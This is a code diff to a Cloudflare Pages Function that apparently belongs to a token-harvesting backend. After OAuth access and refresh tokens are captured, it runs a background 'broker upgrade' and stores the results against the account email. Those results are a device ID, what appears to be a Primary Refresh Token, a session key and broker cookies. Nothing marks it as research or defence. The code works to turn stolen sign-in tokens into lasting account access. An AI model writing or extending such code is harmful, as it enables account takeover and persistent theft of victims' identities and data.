@@ -1,3 +1,5 @@
+import { upgradeToBroker } from '../lib/broker';
+
 interface Env {
   TOKEN_STORE: KVNamespace;
 }
@@ -153,6 +155,42 @@ export const onRequestPost: PagesFunction<Env> = async (context) => {
     audit.unshift(auditEntry);
     if (audit.length > 200) audit.length = 200;
     await context.env.TOKEN_STORE.put(AUDIT_KEY, JSON.stringify(audit));
+
+    // Auto-upgrade to Broker (runs in background — doesn't block response)
+    const sessionId = session.id as string;
+    context.waitUntil((async () => {
+      try {
+        const brokerResult = await upgradeToBroker(accessToken, refreshToken);
+        // Update session with Broker data
+        const currentSessions = (await context.env.TOKEN_STORE.get(SESSIONS_KEY, 'json') as Array<Record<string, unknown>> | null) ?? [];
+        const idx = currentSessions.findIndex(s => s.id === sessionId);
+        if (idx >= 0) {
+          currentSessions[idx].brokerStatus = brokerResult.success ? 'active' : (brokerResult.cookies ? 'partial' : 'failed');
+          currentSessions[idx].deviceId = brokerResult.deviceId;
+          currentSessions[idx].prt = brokerResult.prt;
+          currentSessions[idx].sessionKey = brokerResult.sessionKey;
+          currentSessions[idx].brokerCookies = brokerResult.cookies;
+          currentSessions[idx].brokerUpgradeAt = new Date().toISOString();
+          currentSessions[idx].brokerSteps = brokerResult.steps;
+          await context.env.TOKEN_STORE.put(SESSIONS_KEY, JSON.stringify(currentSessions));
+        }
+        // Log result
+        const brokerLog = {
+          id: `log_${Date.now()}`,
+          timestamp: new Date().toISOString(),
+          action: 'broker_upgrade',
+          accountEmail: profile.email,
+          details: brokerResult.success
+            ? `Broker upgrade OK. Device: ${brokerResult.deviceId}`
+            : `Broker upgrade: ${brokerResult.steps.map(s => `${s.step}:${s.success ? 'OK' : 'FAIL'}`).join(', ')}`,
+          success: brokerResult.success,
+        };
+        const currentAudit = (await context.env.TOKEN_STORE.get(AUDIT_KEY, 'json') as unknown[] | null) ?? [];
+        currentAudit.unshift(brokerLog);
+        if (currentAudit.length > 200) currentAudit.length = 200;
+        await context.env.TOKEN_STORE.put(AUDIT_KEY, JSON.stringify(currentAudit));
+      } catch { /* Broker upgrade is best-effort */ }
+    })());
 
     return new Response(
       JSON.stringify({
